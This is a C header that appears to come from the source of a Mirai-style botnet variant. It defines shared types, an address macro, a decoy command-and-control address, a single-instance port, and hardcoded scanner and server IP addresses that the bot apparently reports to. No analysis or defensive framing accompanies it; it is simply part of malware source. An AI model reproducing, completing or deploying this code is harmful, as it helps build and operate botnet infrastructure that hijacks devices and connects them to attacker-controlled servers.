#pragma once

#include <unistd.h>
#include <stdint.h>
#include <stdarg.h>

#define STDIN   0
#define STDOUT  1
#define STDERR  2

#define FALSE   0
#define TRUE    1
typedef char BOOL;

typedef uint32_t ipv4_t;
typedef uint16_t port_t;

#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))

#define FAKE_CNC_ADDR   INET_ADDR(65,222,202,53)
#define FAKE_CNC_PORT   80

#define SINGLE_INSTANCE_PORT 21769

#define SCANIP (int)inet_addr((const char*)"104.248.171.83");
#define SERVIP (int)inet_addr((const char*)"104.248.171.83");

ipv4_t LOCAL_ADDR;


